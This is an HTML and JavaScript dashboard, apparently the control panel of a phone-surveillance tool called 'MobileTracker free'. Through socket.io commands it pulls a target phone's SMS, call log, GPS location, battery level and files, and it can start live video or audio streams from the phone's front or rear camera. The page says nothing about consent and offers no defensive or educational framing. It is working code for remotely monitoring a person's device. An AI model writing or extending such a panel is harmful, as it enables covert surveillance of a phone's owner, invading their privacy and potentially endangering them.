<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MobileTracker Dashboard</title>
    <script src="/socket.io/socket.io.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --sidebar-bg: #2c3e50; --topbar-bg: #ffffff; --main-bg: #f4f7f6;
            --blue: #3498db; --teal: #1abc9c; --purple: #9b59b6; --yellow: #f1c40f;
            --orange: #e67e22; --red: #e74c3c; --green: #2ecc71; --dark: #34495e;
        }

        body { font-family: 'Open Sans', sans-serif; margin: 0; background: var(--main-bg); display: flex; height: 100vh; overflow: hidden; }

        /* Sidebar */
        .sidebar { width: 240px; background: var(--sidebar-bg); color: white; flex-shrink: 0; overflow-y: auto; }
        .sidebar-brand { padding: 20px; background: #1a252f; font-weight: bold; font-size: 1.2rem; }
        .menu-item { padding: 12px 20px; display: flex; align-items: center; color: #bdc3c7; cursor: pointer; border-left: 3px solid transparent; }
        .menu-item:hover, .menu-item.active { background: #3e5871; color: white; border-left: 3px solid var(--teal); }
        .menu-item i { margin-right: 15px; width: 20px; text-align: center; }

        /* Content Area */
        .main { flex: 1; overflow-y: auto; display: flex; flex-direction: column; }
        .top-nav { height: 50px; background: #2c3e50; color: white; display: flex; align-items: center; padding: 0 20px; justify-content: space-between; }
        .container { padding: 25px; }

        /* Top Status Tiles */
        .status-row { display: flex; gap: 15px; margin-bottom: 25px; }
        .tile { background: white; flex: 1; border-radius: 3px; display: flex; overflow: hidden; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
        .tile-icon { width: 80px; display: flex; align-items: center; justify-content: center; font-size: 2.5rem; color: rgba(255,255,255,0.8); }
        .tile-content { padding: 15px; flex: 1; display: flex; flex-direction: column; justify-content: center; }
        .tile-content label { font-size: 0.8rem; font-weight: bold; color: #666; margin-bottom: 5px; }
        .tile-content span { font-size: 1.1rem; color: #333; }

        /* Feature Grid */
        .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; margin-top: 20px; }
        .card { padding: 20px; color: white; border-radius: 4px; position: relative; cursor: pointer; min-height: 100px; display: flex; justify-content: space-between; }
        .card .info { z-index: 2; }
        .card .count { font-size: 2.2rem; font-weight: 300; }
        .card .label { font-size: 0.8rem; font-weight: bold; text-transform: uppercase; margin-top: 10px; }
        .card i.bg-icon { position: absolute; left: 15px; top: 15px; font-size: 4rem; opacity: 0.15; z-index: 1; }

        /* Live Viewing Section (image_c4a5af.png Style) */
        .live-section { display: none; background: white; padding: 30px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); text-align: center; }
        .live-nav { display: flex; border-bottom: 1px solid #ddd; margin-bottom: 20px; }
        .live-nav div { padding: 10px 20px; color: var(--blue); border-bottom: 2px solid transparent; cursor: pointer; }
        .live-nav div.active { border-bottom: 2px solid var(--red); font-weight: bold; }
        
        .mode-selector { display: flex; justify-content: center; gap: 30px; margin: 30px 0; }
        .mode-item { border: 1px solid #ddd; padding: 20px; width: 80px; cursor: pointer; position: relative; }
        .mode-item.selected { border-color: var(--blue); }
        .mode-item i { font-size: 2rem; color: var(--orange); }
        .mode-item .check { position: absolute; top: 5px; right: 5px; color: var(--blue); display: none; }
        .mode-item.selected .check { display: block; }
        
        select { width: 250px; padding: 8px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 4px; }
        .btn-toggle { background: var(--red); color: white; border: none; padding: 8px 25px; border-radius: 4px; cursor: pointer; font-weight: bold; }

        #live-frame-container { margin-top: 20px; background: #000; border-radius: 8px; display: none; }
        #live-frame { max-width: 100%; max-height: 400px; }
    </style>
</head>
<body>

    <div class="sidebar">
        <div class="sidebar-brand">MobileTracker <span style="font-weight:300">free</span></div>
        <div class="menu-item active" onclick="showTab('dashboard')"><i class="fa fa-home"></i> Dashboard</div>
        <div class="menu-item" onclick="sendCmd('get-sms')"><i class="fa fa-envelope"></i> SMS</div>
        <div class="menu-item" onclick="sendCmd('get-calls')"><i class="fa fa-phone"></i> Calls</div>
        <div class="menu-item" onclick="sendCmd('get-gps')"><i class="fa fa-location-dot"></i> Locations</div>
        <div class="menu-item" onclick="showTab('live')"><i class="fa fa-video"></i> Live viewing</div>
        <div class="menu-item" onclick="sendCmd('get-files')"><i class="fa fa-folder-open"></i> File Explorer</div>
    </div>

    <div class="main">
        <div class="top-nav">
            <div><i class="fa fa-mobile-screen"></i> RMX2020</div>
            <div><i class="fa fa-user"></i> <i class="fa fa-gear" style="margin-left:15px"></i></div>
        </div>

        <div id="dashboard-tab" class="container">
            <div class="status-row">
                <div class="tile"><div class="tile-icon" style="background:#bdc3c7"><i class="fa fa-signal"></i></div><div class="tile-content"><label>Online status</label><span><i class="fa fa-check" style="color:var(--green)"></i> Connected</span></div></div>
                <div class="tile"><div class="tile-icon" style="background:var(--red)"><i class="fa fa-battery-half"></i></div><div class="tile-content" style="background:var(--red); color:white;"><label style="color:white">Battery</label><span id="batt" style="color:white; font-size:1.5rem">-- %</span></div></div>
                <div class="tile" style="flex:2"><div class="tile-icon" style="background:var(--blue)"><i class="fa fa-map-marked-alt"></i></div><div class="tile-content" style="background:var(--blue); color:white;"><label style="color:white">Location</label><span id="loc-text" style="font-size:0.9rem">Waiting for GPS update...</span></div></div>
            </div>

            <h3 style="color:#666; font-weight:400">Dashboard</h3>
            <div class="grid">
                <div class="card" style="background:var(--blue)" onclick="sendCmd('get-sms')"><i class="fa fa-envelope bg-icon"></i><div class="info"><div class="count" id="sms-count">0</div><div class="label">SMS</div></div></div>
                <div class="card" style="background:var(--teal)" onclick="sendCmd('get-calls')"><i class="fa fa-phone bg-icon"></i><div class="info"><div class="count" id="call-count">0</div><div class="label">Calls</div></div></div>
                <div class="card" style="background:var(--purple)"><i class="fa fa-location-dot bg-icon"></i><div class="info"><div class="count">50+</div><div class="label">Locations</div></div></div>
                <div class="card" style="background:var(--yellow)"><i class="fa fa-image bg-icon"></i><div class="info"><div class="count">0</div><div class="label">Pictures</div></div></div>
                <div class="card" style="background:var(--orange)"><i class="fa fa-gamepad bg-icon"></i><div class="info"><div class="count">0</div><div class="label">Apps</div></div></div>
                <div class="card" style="background:var(--blue)"><i class="fa fa-address-book bg-icon"></i><div class="info"><div class="count">0</div><div class="label">Contacts</div></div></div>
                <div class="card" style="background:var(--green)"><i class="fa fa-chrome bg-icon"></i><div class="info"><div class="count">0</div><div class="label">Site Web</div></div></div>
                <div class="card" style="background:var(--teal)"><i class="fa fa-binoculars bg-icon"></i><div class="info"><div class="count">0</div><div class="label">Screenshot</div></div></div>
            </div>
        </div>

        <div id="live-tab" class="container" style="display:none">
            <div class="live-section">
                <div class="live-nav"><div class="active">Live</div><div>Record</div></div>
                <div class="mode-selector">
                    <div class="mode-item selected" onclick="selectMode('video', this)"><i class="fa fa-video"></i><div class="check"><i class="fa fa-check-circle"></i></div><div style="font-size:0.7rem; color:#666">VIDEO</div></div>
                    <div class="mode-item" onclick="selectMode('audio', this)"><i class="fa fa-volume-up" style="color:var(--purple)"></i><div class="check"><i class="fa fa-check-circle"></i></div><div style="font-size:0.7rem; color:#666">AUDIO</div></div>
                    <div class="mode-item"><i class="fa fa-desktop" style="color:var(--red)"></i><div style="font-size:0.7rem; color:#666">SCREEN</div></div>
                </div>
                <select id="cam-sel"><option value="0">Rear camera</option><option value="1">Front camera</option></select><br>
                <select><option>No sound</option><option>Capture audio</option></select><br>
                <select><option>Unlimited duration</option></select><br>
                <div style="margin: 20px 0;">Record <input type="checkbox" id="rec-toggle"></div>
                <button class="btn-toggle" onclick="startStream()">START STREAM</button>
                <button class="btn-toggle" style="background:#666; margin-left:10px" onclick="sendCmd('stop-stream')">STOP</button>

                <div id="live-frame-container">
                    <img id="live-frame" src="">
                </div>
            </div>
        </div>
    </div>

    <script>
        const socket = io();
        let currentMode = 'video';
        function sendCmd(c) { socket.emit('phone-execute', c); }
        function showTab(tab) {
            document.getElementById('dashboard-tab').style.display = (tab==='dashboard'?'block':'none');
            document.getElementById('live-tab').style.display = (tab==='live'?'block':'none');
        }
        function selectMode(m, el) {
            currentMode = m;
            document.querySelectorAll('.mode-item').forEach(i => i.classList.remove('selected'));
            el.classList.add('selected');
        }
        function startStream() {
            const cam = document.getElementById('cam-sel').value;
            sendCmd(`stream:${cam}:${currentMode}`);
            document.getElementById('live-frame-container').style.display = 'block';
        }
        socket.on('battery-update', v => document.getElementById('batt').innerText = v + ' %');
        socket.on('data-stream', b => document.getElementById('live-frame').src = "data:image/jpeg;base64," + b);
        socket.on('sms-data', d => document.getElementById('sms-count').innerText = JSON.parse(d).length);
        socket.on('call-data', d => document.getElementById('call-count').innerText = JSON.parse(d).length);
        socket.on('location-update', d => document.getElementById('loc-text').innerText = `Lat: ${d.lat}, Lng: ${d.lng}`);
    </script>
</body>
</html>
